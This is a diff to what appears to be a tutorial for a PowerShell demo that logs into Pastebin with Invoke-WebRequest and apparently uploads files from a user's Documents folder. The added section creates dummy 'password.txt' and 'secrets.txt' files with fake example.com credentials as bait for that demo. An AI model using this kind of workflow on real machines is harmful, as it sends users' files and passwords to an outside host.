@@ -84,3 +84,20 @@ Invoke-WebRequest -Uri $PasteBinLogin -UseBasicParsing -Body $Body -Method Post 
 
 
 Once this is done… we’re cooking!
+
+### Create some dummy files
+For demo purposes we're going to create 2 dummy files: `password.txt` and `secrets.txt` put these 2 files in your documents folder: `C:\Users\$env:username\Documents`
+
+password.txt has the following contents
+```
+PUT THIS FILE IN C:\Users\$env:username\Documents
+I do silly things like sometimes putting passwords in files. 
+```
+secret.txt has the following contents
+```
+PUT THIS FILE IN C:\Users\$env:username\Documents
+this is my secret file
+my password for example.com is Kameham3ha!
+my username for example.com is ThebrokeShadower
+https://www.example.com/login-or-something
+```
